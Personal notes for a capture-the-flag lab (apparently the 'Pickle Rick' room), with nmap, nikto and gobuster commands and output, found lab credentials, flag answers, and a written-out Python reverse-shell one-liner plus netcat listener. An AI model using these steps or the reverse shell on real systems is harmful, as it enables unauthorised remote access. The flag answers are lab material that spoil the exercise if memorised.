# Playbook

(Could use hydra)

1. nmap scan IP address
    - nmap -sC -sV -oN IP
2. Run a nikto scan and log it
   - nikto -h http://IP | tee nikto.log 
   - Check out robots.txt, if it has one
3. Run gobuster
   - gobuster -u http://IP -w /opt/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
   - there is a login page 
4. Look up source IP 
5. Inspect page source code
6. Command panel is shown, try out commands
    - grep pattern filename -> grep . file.txt
    - while read line; do echo $line; done < clue.txt
7. with a command line, lets set up a reverse shell
   - using python or netcat
   - python3 -c "print('hello')"
8. use pentestmonkey to create a reverse shell with
   - pentestmonkey.net
   - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   - nc -lnvp 9999
9. stabalize reverse shell
   - john hammonds - poor mans pentest -> stabalize_shell3.sh and upload_file_nc.sh
10. try to become root and snoop

# stabalizing shell

```
nc -lnvp 9999
CRTL + z
stty raw -echo;fg
ENTER
export TERM=xterm

```


```
export IP=10.10.200.202

```

# results

```
Username: R1ckRul3s

Wubbalubbadubdub



Sup3rS3cretPickl3Ingred.txt
    -> mr. meeseek hair
assets

clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
-> echo Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== | ba0== base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d 
-> rabbit hole

2nd ingredeient: 1 jerry tear

3rd ingredients: fleeb juice



```

# nmap results

```
# Nmap 7.60 scan initiated Wed Jun 28 01:41:28 2023 as: nmap -v2 -sC -sV -oN picklerick 10.10.200.202
Nmap scan report for ip-10-10-200-202.eu-west-1.compute.internal (10.10.200.202)
Host is up, received arp-response (0.00065s latency).
Scanned at 2023-06-28 01:41:28 BST for 8s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:19:a9:19:98:47:e1:1c:d6:c9:93:05:3a:21:f7:31 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXQvVH41KSuadM08ffKn4AJ84TYkDWCZi4GsFZSamPsfWXdwpjZDVrd7i13/AeBHzH1XsKU+Hup7rNRhZMWFCQp2wIZ0ZpE+TnZZYCQ2fLRE6iZt89DEdG69sBQ18u5cQMMLVLLEqNO3UmNK879VV5e44yI+kD9X0oWeQwx9Q7ti7nlhJfU8/7aoju8oMVe9o2q4Ob2I+8wTnhwkJD1bZ1piaQH1DDXsc8KpPRpVsBD4YnYvMS2RoZc8RphexiNPxpoN+O1ZliykH5rkO/vHDmECmuxsCVLelF4nqQ2QagQxD0Kkk1HizHKHAgt+7ZyAru9ujoouZNhFTdkLFh0oQT
|   256 be:28:92:ac:7b:ae:dc:1e:9c:3c:c6:46:d9:7f:61:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBS067AqsZvzoH2Rae/jK9l4jbjnQ990cVCD30qDX0fpi1pwY3t3hSl33C+v1E7rWdkOF/js8RTb3Okledd3xQk=
|   256 e3:aa:0b:c9:71:5b:69:4b:a9:46:ed:6d:fe:5a:34:f5 (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIOfUkbIJjqVzU4y7ZSvm2LaOHH7yS0+j3cIwEa1G92I
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 02:ED:86:D2:ED:F9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 28 01:41:36 2023 -- 1 IP address (1 host up) scanned in 8.33 seconds
```

# nikto results

```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.200.202
+ Target Hostname:    ip-10-10-200-202.eu-west-1.compute.internal
+ Target Port:        80
+ Start Time:         2023-06-28 01:58:08 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x426 0x5818ccf125686 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2023-06-28 01:58:17 (GMT1) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

# gobuster results

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.200.202
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,cgi,html,js,css,py,php,sh
[+] Timeout:        10s
===============================================================
2023/06/28 02:22:29 Starting gobuster
===============================================================
/index.html (Status: 200)
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
/robots.txt (Status: 200)
/denied.php (Status: 302)
/server-status (Status: 403)
/clue.txt (Status: 200)
===============================================================
2023/06/28 02:25:19 Finished
===============================================================
```

# task 1

```
1. What is the first ingredient that Rick needs?

2. What is the second ingredient in Rick’s potion?

3. What is the last and final ingredient?

```